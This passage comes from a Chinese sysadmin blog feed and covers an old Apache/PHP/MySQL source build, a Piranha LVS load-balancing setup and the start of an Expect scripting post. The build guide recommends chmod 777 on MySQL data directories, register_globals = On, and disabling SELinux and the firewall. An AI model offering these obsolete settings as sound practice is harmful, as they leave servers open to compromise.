<br>/var/lib/mysql/*.err&nbsp;你会发现mysql只所以不能启动，是因为/var/lib/mysql的权限不允许mysql服务访问，英文mysql默认是调用mysql用户来启动服务的，好了，既然知道是什么原因找到不能启动，那就简单了。我们只要


<br>


<br>chown&nbsp;-R&nbsp;mysql:mysql&nbsp;/var/lib/mysql&nbsp;就行，如果还是启动不了，再慢慢调试权限，反正一般启动不了都是权限的问题。


<br>


<br>如果大家还是不能启动不了的话，那就用我的比较繁琐的权限的设置，反正我每次都是这么做的，一般不会有问题，见下：


<br>


<br>chown&nbsp;-R&nbsp;root&nbsp;/usr/local/mysql&nbsp;


<br>chgrp&nbsp;-R&nbsp;mysql&nbsp;/usr/local/mysql&nbsp;


<br>chown&nbsp;-R&nbsp;root&nbsp;/usr/local/mysql/bin&nbsp;


<br>chgrp&nbsp;-R&nbsp;mysql&nbsp;/usr/local/mysql/bin&nbsp;


<br>chgrp&nbsp;-R&nbsp;mysql&nbsp;/var/lib/mysql&nbsp;


<br>chmod&nbsp;777&nbsp;/var/lib/mysql&nbsp;


<br>chown&nbsp;-R&nbsp;root&nbsp;/var/lib/mysql/mysql&nbsp;


<br>chgrp&nbsp;-R&nbsp;mysql&nbsp;/var/lib/mysql/mysql&nbsp;


<br>chmod&nbsp;777&nbsp;/var/lib/mysql/mysql&nbsp;


<br>chown&nbsp;-R&nbsp;root&nbsp;/var/lib/mysql/mysql/*&nbsp;


<br>chgrp&nbsp;-R&nbsp;mysql&nbsp;/var/lib/mysql/mysql/*&nbsp;


<br>chmod&nbsp;777&nbsp;/var/lib/mysql/mysql/*&nbsp;


<br>chmod&nbsp;777&nbsp;/usr/local/mysql/lib/mysql/libmysqlclient.a


<br>


<br>&nbsp;


<br>


<br>做完上面的步骤，然后把你编译目录的一个脚本COPY过去


<br>


<br>cp&nbsp;support-files/mysql.server&nbsp;/etc/rc.d/init.d/mysqld


<br>


<br>chkconfig&nbsp;&#8211;add&nbsp;mysqld


<br>


<br>用ntsysv设置使mysql每次启动都能自动运行。


<br>


<br>好了，至此mysql安装完毕，你可以这样起动你的mysql服务


<br>


<br>/etc/rc.d/init.d/mysqld&nbsp;start


<br>


<br>下面这步比较关键，


<br>


<br>ln&nbsp;-s&nbsp;/usr/local/mysql/lib/mysql&nbsp;/usr/lib/mysql


<br>ln&nbsp;-s&nbsp;/usr/local/mysql/include/mysql&nbsp;/usr/include/mysql


<br>


<br>大家可以不做这步，大可以在编译其他软件的时候自定义myslq的库文件路径，但我还是喜欢把库文件链接到默认的位置，这样你在编译类似PHP，Vpopmail等软件时可以不用指定mysql的库文件地址。


<br>


<br>2.安装Apache1.3.29。我没有选择安装Apache2.0是我对他还是不放心，因为网上最新公布的apache的漏洞基本上是针对2.0，当然大家可以自己选择安装相应的版本。我这里讲的都是采用DSO动态编译的方法编译Apache.


<br>


<br>至于有关apache的编译方法，可以参考我以前的文章《apache的静态/动态编译在apache+php+mysql的应用》&nbsp;http://www.5ilinux.com/apache01.html&nbsp;


<br>


<br>软件获取：http://httpd.apache.org/


<br>


<br>tar&nbsp;zvxf&nbsp;apache_1.3.29.tar.gz


<br>cd&nbsp;apache_1.3.29


<br>修改src/include/httpd.h&nbsp;增大最大线程数


<br>


<br>#define&nbsp;HARD_SERVER_LIMIT&nbsp;256


<br>


<br>改成


<br>


<br>#define&nbsp;HARD_SERVER_LIMIT&nbsp;2560


<br>


<br>保存退出编译apache


<br>


<br>


<br>./configure&nbsp;&#8211;prefix=/usr/local/apache&nbsp;&#8211;enable-module=so&nbsp;&#8211;enable-module=rewrite&nbsp;&#8211;enable-shared=max&nbsp;&#8211;htdocsdir=/var/www&nbsp;&amp;&amp;


<br>make&nbsp;&amp;&amp;


<br>make&nbsp;install


<br>


<br>#这里我们通过enable-module参数告诉设置脚本，我们需要启动so和rewrite模块，so模块是用来提DSO支持的apache核心模块，而rewrite模块则是用意实现地址重写的模块，由于rewrite模块需要DBM支持，如果在初次安装时没有编译进apache，以后需要用到时需要重新编译整个apache才可以实现。为此除非你可以确定以后不会用到rewrite模块，否则还是建议你在第一次编译的时候把rewrite模块编译好。


<br>


<br>enable-shared=max&nbsp;这个参数的作用时编译apache时，把除了so以外的所有apache的标准模块都编译成DSO模块。而不是编译进apache核心内。


<br>


<br>&nbsp;


<br>


<br>好了安装apache很简单的哦，启动apache看看


<br>


<br>/usr/local/apache/bin/apachectl&nbsp;start


<br>


<br>然后用ie看http://你的服务器地址。应该能看到熟悉的apache羽毛标志。


<br>


<br>3.安装PHP4.3.4


<br>


<br>软件获取：http://www.php.net/downloads.php


<br>


<br>tar&nbsp;zvxf&nbsp;php-4.3.4.tar.gz


<br>cd&nbsp;php-4.3.4


<br>


<br>./configure&nbsp;\


<br>&#8211;prefix=/usr/local/php&nbsp;\


<br>&#8211;with-mysql=/usr/local/mysql&nbsp;\&nbsp;


<br>&#8211;enable-force-cgi-redirect&nbsp;\


<br>&#8211;with-freetype-dir=/usr&nbsp;\


<br>&#8211;with-png-dir=/usr&nbsp;\


<br>&#8211;with-gd&nbsp;&#8211;enable-gd-native-ttf&nbsp;\


<br>&#8211;with-ttf&nbsp;\


<br>&#8211;with-gdbm&nbsp;\


<br>&#8211;with-gettext&nbsp;\


<br>&#8211;with-iconv&nbsp;\


<br>&#8211;with-jpeg-dir=/usr&nbsp;\


<br>&#8211;with-png&nbsp;\


<br>&#8211;with-zlib&nbsp;\


<br>&#8211;with-xml&nbsp;\


<br>&#8211;enable-calendar&nbsp;\


<br>&#8211;with-apxs=/usr/local/apache/bin/apxs


<br>


<br>make


<br>


<br>make&nbsp;install


<br>


<br>&nbsp;


<br>


<br>#我这里由于服务器需要用到GD库，所以加了一些支持GD的编译参数&nbsp;，GD直接用了redhat自带的GD库，大家没有安装的话可以从安装盘安装，注意除了安装GD以外，还要安装libjpeg，libpng等库文件。另外&#8211;with-mysql=/usr/local/mysql指向你安装mysql的路径。&#8211;with-apxs指向apache的apxs文件的路径。


<br>


<br>vi&nbsp;/usr/local/apache/conf/httpd.conf


<br>


<br>查找&lt;IfModule&nbsp;mod_mime.c&gt;;&nbsp;


<br>


<br>在此范围添加&nbsp;


<br>


<br>AddType&nbsp;application/x-httpd-php&nbsp;.php&nbsp;


<br>AddType&nbsp;application/x-httpd-php-source&nbsp;.phps&nbsp;


<br>


<br>&nbsp;


<br>


<br>然CPOPY&nbsp;PHP的配置文件


<br>


<br>cp&nbsp;../php4.3.4/php.ini.dist&nbsp;/usr/local/php/lib/php.ini&nbsp;


<br>


<br>修改php.ini文件


<br>register_globals&nbsp;=&nbsp;On


<br>


<br>


<br>ok！重新启动一下apache服务器&nbsp;


<br>/usr/local/apache/bin/apachectl&nbsp;restart&nbsp;


<br>


<br>然后写个php测试页info.php:内容如下&nbsp;


<br>


<br>&lt;?php&nbsp;


<br>phpinfo();&nbsp;


<br>?&gt;;&nbsp;


<br>


<br>正常的话，应该能看到php的信息了，恭喜你的Apche+Mysql+PHP安装成功。


<br>


<br>&nbsp;


<br>


<br>好了写了这么多，希望对大家有所帮助！！！


<br>


<br>


<br>参看文档：


<br>


<br>apache的静态/动态编译在apache+php+mysql的应用&nbsp;http://www.5ilinux.com/apache01.html


<br>


<br>


<br>作者：张微波


<br>


<br>2003年12月3日于北京<br>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[pranha方案实现WEB负载均衡]]></title>
    <link href="http://archulate.github.io/blog/2014/01/03/piranha/"/>
    <updated>2014-01-03T18:59:29+08:00</updated>
    <id>http://archulate.github.io/blog/2014/01/03/piranha</id>
    <content type="html"><![CDATA[<!--more-->


<p><strong>实验平台 :&nbsp; &nbsp; </strong>CentOS release5.2 (Final)</p>


<p><strong>实验目标</strong>: </p>


<p>快速撑握和理解Piranha方案,并利用15分钟构建WEB高可用负载均衡解决方案.</p>


<p><strong>结构：</strong></p>


<p>LVS-ACTIVE：192.168.1.210<br />LVS-BACKUP: 192.168.1.211<br />LVS-VIP: 192.168.1.212<br />Realsever: 192.168.1.204,192.168.1.205<br /><br /><strong>一.</strong><strong>Piranha</strong><strong>方案基本简绍.</strong><br />1.Piranha方案优点:<br />1.1.1配置简洁高效:<br />配置简便一个lvs.conf配置文件即可搞定(类keepalived方案.)<br /><br />1.1.2WEB配置界面.<br />WEB配置对于那些不懂LVS配置的人员来说非常吸引力,你几乎只要花15分钟就可以配置好一个完美的负载均衡及高可用性方案.<br /><br />1.1.3完整的功能:<br /><br />主备LVS (Load Balancer)的Heartbeat和HA (pulse,send_arp)<br />LoadBalancer和Real Server间进程服务的Heartbeat (nanny)<br />IPVS功能 (lvsd)<br />IPVS的管理 (ipvsadm)<br /><br />2.Piranha方案原理结构描述:<br />Piranha方案是基于LVS基础上设计的一套负载均衡高可用解决方案.<br />LVS运行在一对有相似配置的计算机上：<br />一个作为活动LVS Router(Active LVS Router)，<br />一个作为备份LVS Router(Backup LVS Router)。<br /><br />活动LVS Router服务有两个角色：<br /><em> 均衡负载到真实服务器上。<br /></em> 检查真实服务器提供的服务是否正常。<br />备份LVS Router用来监控活动的LVS Router，以备活动的LVS Router失败时由备份LVS Router接管。<br /><img src="http://hiphotos.baidu.com/ewayfly/pic/item/ab265043fbf2b21163800700ca8065380dd78ef5.jpg" width="500" /><br /><br />Pulse:<br />Pulse进程运行在活动LVS Router和备份LVS Router上。<br />在备份LVS Router上，pulse发送一个心跳（heartbeat）到活动LVS Router的公网接口上以检查活动LVS Router是否正常。<br />在活动LVS Router上，pulse启动lvs进程并响应来自于备份LVS Router的心跳。<br /><br />lvsd:<br />lvs进程调用ipvsadm工具去配置和维护IPVS路由表，并为每一个在真实服务器上的虚拟服务启动一个nanny进程。<br /><br />nanny:<br />每一个nanny进程去检查真实服务器上的虚拟服务状态，并将故障情况通知lvs进程。假如一个故障被发现，lvs进程通知ipvsadm在IPVS路由表中将此节点删除。<br /><br />send_arp:<br />如果备份LVS Router未收到来自于活动LVS Router的响应，<br />它将调用send_arp将虚拟IP地址再分配到备份LVS Router的公网接口上。<br />并在公网接口和局域网接口上分别发送一个命令去关掉活动LVS Router上的lvs进程。同时启动自己的lvs进程来调度客户端请求。<br /><br />3.Piranha方案基本套件安装:<br /><ol><li>#yum install ipvsadm modcluster piranha system-config-cluster php php-cli php-common</li></ol><em>复制代码</em><br /><br />4.配置文件介绍:<br />/etc/sysconfig/ha/lvs.cf&nbsp; &nbsp;&nbsp;&nbsp;//由<a href="http://ip:3636">http://ip:3636</a> web界面配置的配置文件写入此文件.<br />/etc/init.d/piranha-gui start&nbsp;&nbsp;//启动piranha服务的WEB配置界面.<br />/etc/init.d/pulse&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;//启动piranha服务读取的就是/etc/sysconfig/ha/lvs.cf.<br /><br />二.&nbsp; &nbsp; Piranha配置<br />配置主LVS服务器.<br /># vi /etc/sysctl.conf找到下面行 //启用数据转发.<br />net.ipv4.ip_forward = 0将0 改成1，net.ipv4.ip_forward = 1<br />执行如下命令来应用：sysctl ?p<br /><br />通过WEB界面配置Piranha服务.<br /># /etc/init.d/piranha-gui start&nbsp;&nbsp;//启动Piranha服务.<br />#/usr/sbin/piranha-passwd&nbsp;&nbsp;//设置密码,请设置你的piranha服务WEB配置登陆密码.<br /><a href="http://192.168.1.210:3636/&amp;nbsp;&amp;nbsp;%E8%BE%93%E5%85%A5%E7%94%A8%E6%88%B7%E5%90%8D:">http://192.168.1.210:3636/&amp;nbsp;&amp;nbsp;%E8%BE%93%E5%85%A5%E7%94%A8%E6%88%B7%E5%90%8D:</a> piranha 及刚才设置的密码登陆.<br />登陆后，选择Global Settings 这是对LVS的配置<br />Primary server public IP 输入公网IP:192.168.1.210,应用后按ACCEPT按钮保存设置。<br />通过WEB配置主LVS的信息<br />1. 配置主LVS<br /><img src="http://hiphotos.baidu.com/ewayfly/pic/item/e85df8f2b211931341ed7dfe65380cd790238df5.jpg" width="466" /><br /><br />2.配置备份LVS<br /><img src="http://hiphotos.baidu.com/ewayfly/pic/item/5c0f93ef76c6a7ef02c29e69fdfaaf51f2de66b3.jpg" width="455" /><br /><br />3. 配置添加LVS( VIP信息)<br /><img src="http://hiphotos.baidu.com/ewayfly/pic/item/40ecb1119313b07e3813d2460cd7912396dd8cf5.jpg" width="507" /><br />4.配置Realserver<br /><img src="http://hiphotos.baidu.com/ewayfly/pic/item/2bf175c6a7efce1b50cffe85af51f3deb58f65b3.jpg" width="493" /><br />点击”编辑”添加具体的Realsever信息.<br /><img src="http://hiphotos.baidu.com/ewayfly/pic/item/090f9013b07eca8096abbba9912397dda04483f5.jpg" width="324" /><br /><br />5.启动LVS服务pulse<br /><ol><li># /etc/init.d/pulse start<br /></li><li>Starting pulse:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;[&nbsp;&nbsp;OK&nbsp;&nbsp;]</li></ol><em>复制代码</em><br />如果不报错,表示启动成功!到此LVS的服务器已经配置完成了启动两个程序 <br />1、piranha-gui&nbsp;&nbsp;是用来配置LVS的<br />2、pulse&nbsp; &nbsp;&nbsp; &nbsp; 是用来启动LVS的<br />&nbsp; &nbsp; <br />6.备份LVS安装与配置<br />备份LVS安装同主LVS安装方法同样.直接将lvs.conf拷贝到相应的目录下:<br />#scp&nbsp;&nbsp;lvs.cf :/etc/sysconfig/ha/<br /># /etc/init.d/pulse start 启动服务即可.<br />7.配置Realserver<br />&nbsp; &nbsp; <br />DR模式配置文件<br />……&hellip;&hellip;..<br /><ol><li>&nbsp; &nbsp;&nbsp; &nbsp; ifconfig lo:0 $WEB_VIP netmask 255.255.255.255 broadcast $WEB_VIP<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp; /sbin/route add -host $WEB_VIP dev lo:0<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp; echo &quot;1&quot; &gt;/proc/sys/net/ipv4/conf/lo/arp_ignore<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp; echo &quot;2&quot; &gt;/proc/sys/net/ipv4/conf/lo/arp_announce<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp; echo &quot;1&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_ignore<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp; echo &quot;2&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_announce<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp; sysctl -p &gt;/dev/null 2&gt;&amp;1<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp; echo &quot;RealServer Start OK&quot;</li></ol><em>复制代码</em><br />&nbsp; &nbsp;&nbsp; &nbsp;…………………….<br />Tunnel模式配置文件.<br />……………………………………<br /><ol><li>&nbsp; &nbsp; ifconfig tunl0 $WEB_VIP netmask 255.255.255.255 broadcast $WEB_VIP<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp; /sbin/route add -host $WEB_VIP dev tunl0<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp; echo &quot;1&quot; &gt;/proc/sys/net/ipv4/conf/tunl0/arp_ignore<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp; echo &quot;2&quot; &gt;/proc/sys/net/ipv4/conf/tunl0/arp_announce<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp; echo &quot;1&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_ignore<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp; echo &quot;2&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_announce<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp; sysctl -p &gt;/dev/null 2&gt;&amp;1</li></ol><em>复制代码</em><br />………………………………………….<br /><br /> 正确配置,并启动服务.<br />8.&nbsp; &nbsp; 测试与日志分析.<br /># ipvsadm ?ln&nbsp; &nbsp; //查看LVS连接状态.<ol><li>IP Virtual Server version 1.2.1 (size=4096)<br /></li><li>Prot LocalAddressort Scheduler Flags<br /></li><li>&nbsp;&nbsp;&ndash;&gt; RemoteAddressort&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;Forward Weight ActiveConn InActConn<br /></li><li>TCP&nbsp;&nbsp;192.168.1.212:80 wrr persistent 30<br /></li><li>&ndash;&gt; 192.168.1.204:80&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; Route&nbsp; &nbsp; 1&nbsp; &nbsp;&nbsp; &nbsp;0&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 0&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br /></li><li>&ndash;&gt; 192.168.1.205:80&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; Route&nbsp; &nbsp; 1&nbsp; &nbsp;&nbsp; &nbsp;0&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 0&nbsp; &nbsp;&nbsp;&nbsp;</li></ol><em>复制代码</em># tail -f /var/log/messages<br /><img src="http://hiphotos.baidu.com/ewayfly/pic/item/cdd8a4efce1b9d163323ac2ef3deb48f8d5464b3.jpg" width="600" /><br />【注】服务切换测试:<br />停掉主LVS服务上的pulse查看master是否能正常接管.测试过程中多注<br />意分析日志.在Linuxtone网站编写heartbeat+lvs方案的时候还需要自己送一个arping命令告诉网关我的MAC发生变化了.<br />但是Piranha方案能自动送一个arp命令.<br /><br />三.&nbsp; &nbsp;&nbsp; &nbsp;LVS配置文件详解及相关技巧介绍<br />1.&nbsp; &nbsp; lvs.conf 配置及详解: <a href="http://bbs.linuxtone.org/thread-1603-1-1.html" target="_blank"><a href="http://bbs.linuxtone.org/thread-1603-1-1.html">http://bbs.linuxtone.org/thread-1603-1-1.html</a></a><br />2.&nbsp; &nbsp; 修改Piranha登陆用户名及监听端口?<br />&nbsp; &nbsp;&nbsp; &nbsp;启动/etc/init.d/piranha-gui,实际上是执行如下配置文件.<br />&nbsp; &nbsp;&nbsp; &nbsp;/usr/sbin/piranha_gui -f /etc/sysconfig/ha/conf/httpd.conf<br />&nbsp; &nbsp;&nbsp;&nbsp;#cd /etc/sysconfig/ha 下目录介绍.<br />&nbsp; &nbsp;&nbsp;&nbsp;lvs.cf&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; //Piranha方案实现LVS核心配置文件.<br />&nbsp; &nbsp;&nbsp;&nbsp;conf/{httpd.conf, piranha.passwd}&nbsp; &nbsp;//apache及认证相关文件.<br />&nbsp; &nbsp;&nbsp;&nbsp;web/&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //此目录下存放WEB配置界面的PHP相关程序,<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;如果想对WEB界面美化,请修改文件.<br />&nbsp; &nbsp;&nbsp;&nbsp;mdules/&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; //apache一些相关模块.<br />&nbsp; &nbsp;&nbsp; &nbsp; <br />&nbsp; &nbsp; # vi /etc/sysconfig/ha/conf/httpd.conf (将原端口3636改为81,你也可以自定义此端口)<br />&nbsp; &nbsp;&nbsp;&nbsp;<img src="http://hiphotos.baidu.com/ewayfly/pic/item/1cf1cd1b9d16fdfa6088f0a1b48f8c5495ee7bb3.jpg" width="347" /><br />&nbsp; &nbsp;&nbsp;&nbsp;默认WEB界面是能过piranha账号登陆，如何创建自己定义的账号登陆呢?<ol><li>&nbsp;&nbsp;# htpasswd -c /etc/sysconfig/ha/conf/lvs.pass netseek&nbsp; &nbsp;&nbsp;&nbsp;</li></ol><em>复制代码</em>// 上述命令是添加用户netseek,并将账号信息写入lvs.pass这个文件.&nbsp;&nbsp;<br />&nbsp; &nbsp;&nbsp;&nbsp;# vi /etc/sysconfig/ha/conf/httpd.conf <br />&nbsp; &nbsp;&nbsp; &nbsp; <img src="http://hiphotos.baidu.com/ewayfly/pic/item/280db37eca806538f844265d97dda144ac3482f5.jpg" width="370" /><br />&nbsp; &nbsp;&nbsp;&nbsp;# /etc/init.d/piranha-gui restart 重启服务即可生效.<br />&nbsp; &nbsp;&nbsp;&nbsp;上述技巧只是简单的抛砖引玉,你可以修改WEB服务的PHP相关程序,添加一些流量<br />&nbsp; &nbsp;&nbsp;&nbsp;或者WEB连接状态监控的代码.还可以自己给apache添加一些你自己写的模块,<br />&nbsp; &nbsp;&nbsp;&nbsp;总之你可以再现有的piranha上做很多的改造去实&nbsp; &nbsp;现你想要的更完美的系统.<br />&nbsp; &nbsp;&nbsp;&nbsp;更多技巧请实时关注: <a href="http://bbs.linuxtone.org/" target="_blank"><a href="http://bbs.linuxtone.org/">http://bbs.linuxtone.org/</a></a> 负载均衡版块.<br /><br />&nbsp;&nbsp;3.&nbsp;&nbsp;如果启动/etc/init.d/piranha-gui start<br />若遇到以下错误提示：<ol><li>Starting piranha-gui: (13)Permission denied: make_sock: could not bind to address [::]:3636</li></ol><em>复制代码</em>关闭掉selinux跟firewall<br /><br />一.相关参考文档<br />1．<a href="http://bbs.linuxtone.org/thread-1402-1-1.html" target="_blank">LVS高可用性方案汇总 [Linuxtone为您提供了各种高可用负载均衡解决方案</a><br />2.&nbsp;&nbsp;<a href="http://bbs.linuxtone.org/thread-1052-1-1.html" target="_blank">LVS连接状态监控</a><br />3．<a href="http://sourceware.org/piranha/" target="_blank">Piranha官方参考文档推荐阅读</a><br /><br />本文基于开源分享精神之上方便大家理解和了解红帽Piranha方案，希望能快速帮你解决工作中的一些问题，如有不足之处请见谅！同时欢迎各位对WEB架构，集群规划等相关的感兴趣的朋友请来加入<a href="http://bbs.linuxtone.org/" target="_blank">Linuxtone</a>这个社区。我们热情期待你的加入！ </div></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Expect实现交互]]></title>
    <link href="http://archulate.github.io/blog/2013/12/03/expect/"/>
    <updated>2013-12-03T18:36:35+08:00</updated>
    <id>http://archulate.github.io/blog/2013/12/03/expect</id>
    <content type="html"><![CDATA[<!--more-->


<p>使用expect脚本可以完成一定程度上的自动交互，不过又要学习了。<br />
关于expect的简单介绍。可以看这里 <a href="http://zh.wikipedia.org/zh/Expect" target="_blank"><a href="http://zh.wikipedia.org/zh/Expect">http://zh.wikipedia.org/zh/Expect</a></a><br />
下面我记录一下基本用法</p></p>

<hr />


<p>expect脚本可以接受从bash传递过来的参数.可以使用[lindex $argv n]获得，n从0开始，分别表示第一个,第二个,第三个&#8230;.参数<br />
看下面的expect脚本的例子</p>


<p></p>


<!-- Crayon Syntax Highlighter v2.5.0 -->


<pre><code>    &lt;div id="crayon-53145a9320430229454941" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;"&gt;



        &lt;div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"&gt;&lt;span class="crayon-title"&gt;&lt;/span&gt;

        &lt;div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"&gt;&lt;div class="crayon-button crayon-nums-button" title="切换显示行编号"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-plain-button" title="纯文本显示代码"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-wrap-button" title="切换自动换行"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-expand-button" title="Expand Code"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-copy-button" title="Copy"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"&gt;&lt;div class="crayon-button-icon"&gt;&lt;/div&gt;&lt;/div&gt;&lt;span class="crayon-language"&gt;Shell&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;

        &lt;div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"&gt;&lt;/div&gt;

        &lt;div class="crayon-plain-wrap"&gt;&lt;textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;"&gt;
</code></pre>

<h1>!/usr/bin/expect</h1>

<p>set username [lindex $argv 0]</p>

<p>set password [lindex $argv 1]</p>

<p>set server [lindex $argv 2]</p>

<p>send_user  &ldquo;UserName is $username\n&rdquo;</p>

<p>send_user  &ldquo;PassWord is $password\n&rdquo;</p>

<p>send_user  &ldquo;Server is $server\n&rdquo;</p>

<p>send_user &ldquo;Total arg num is $argc\n&rdquo;</p>

<p>send_user &ldquo;last but one arg is[lindex $argv [expr $argc-1]]\n&rdquo;</p>

<p>if { $argc != 3 &amp;&amp; $argc != 2 } {</p>

<pre><code>send_user "Usage:username password \[server\] \n"

send_user "\tthe default server is 211.65.64.1 \n"

exit
</code></pre>

<p>}</textarea></div></p>

<pre><code>        &lt;div class="crayon-main" style=""&gt;

            &lt;table class="crayon-table"&gt;

                &lt;tr class="crayon-row"&gt;

            &lt;td class="crayon-nums " data-settings="show"&gt;

                &lt;div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320430229454941-1"&gt;1&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320430229454941-2"&gt;2&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320430229454941-3"&gt;3&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320430229454941-4"&gt;4&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320430229454941-5"&gt;5&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320430229454941-6"&gt;6&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320430229454941-7"&gt;7&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320430229454941-8"&gt;8&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320430229454941-9"&gt;9&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320430229454941-10"&gt;10&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320430229454941-11"&gt;11&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320430229454941-12"&gt;12&lt;/div&gt;&lt;div class="crayon-num" data-line="crayon-53145a9320430229454941-13"&gt;13&lt;/div&gt;&lt;div class="crayon-num crayon-striped-num" data-line="crayon-53145a9320430229454941-14"&gt;14&lt;/div&gt;&lt;/div&gt;

            &lt;/td&gt;

                    &lt;td class="crayon-code"&gt;&lt;div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"&gt;&lt;div class="crayon-line" id="crayon-53145a9320430229454941-1"&gt;&lt;span class="crayon-p"&gt;#!/usr/bin/expect&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320430229454941-2"&gt;&lt;span class="crayon-e"&gt;set &lt;/span&gt;&lt;span class="crayon-v"&gt;username&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;[&lt;/span&gt;&lt;span class="crayon-i"&gt;lindex&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-v"&gt;$argv&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;0&lt;/span&gt;&lt;span class="crayon-sy"&gt;]&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320430229454941-3"&gt;&lt;span class="crayon-e"&gt;set &lt;/span&gt;&lt;span class="crayon-v"&gt;password&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;[&lt;/span&gt;&lt;span class="crayon-i"&gt;lindex&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-v"&gt;$argv&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;1&lt;/span&gt;&lt;span class="crayon-sy"&gt;]&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320430229454941-4"&gt;&lt;span class="crayon-e"&gt;set &lt;/span&gt;&lt;span class="crayon-v"&gt;server&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;[&lt;/span&gt;&lt;span class="crayon-i"&gt;lindex&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-v"&gt;$argv&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;2&lt;/span&gt;&lt;span 